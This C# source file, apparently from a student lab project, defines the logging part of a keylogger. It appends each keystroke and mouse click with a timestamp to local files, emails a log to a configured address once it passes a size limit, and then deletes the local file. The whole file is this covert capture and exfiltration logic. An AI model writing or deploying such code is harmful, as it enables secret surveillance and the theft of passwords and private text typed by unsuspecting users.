using System;
using System.IO;

namespace Laba_8
{
    public class Logger
    {
        private readonly Settings _config;
        private const string KeyboardLog = "./keyboard.log";
        private const string MouseLog = "./mouse.log";

        public Logger(Settings config)
        {
            _config = config;
        }

        public void KeyLogger(string keyName)
        {
            using (var streamWriter = new StreamWriter(KeyboardLog, true))
            {
                streamWriter.WriteLine("[" + DateTime.Now + "]: Key[" + keyName + "]");
                streamWriter.Dispose();
            }
            CheckSize(KeyboardLog);
        }

        public void MouseLogger(string keyName, string position)
        {
            using (var streamWriter = new StreamWriter(MouseLog, true))
            {
                streamWriter.WriteLine("[" + DateTime.Now + "]: Key[" + keyName + "]"+ " Position["+ position + "]");
            }
            CheckSize(MouseLog);
        }

        private void CheckSize(string filePath)
        {
            if (new FileInfo(filePath).Length > _config.FileSize)
            {
                if (!string.IsNullOrEmpty(_config.Email))
                {
                    new EmailManager().SendEmail(_config.Email, "Laba 8 Log", filePath);
                    new FileInfo(filePath).Delete();
                }
            }
        }
    }
}
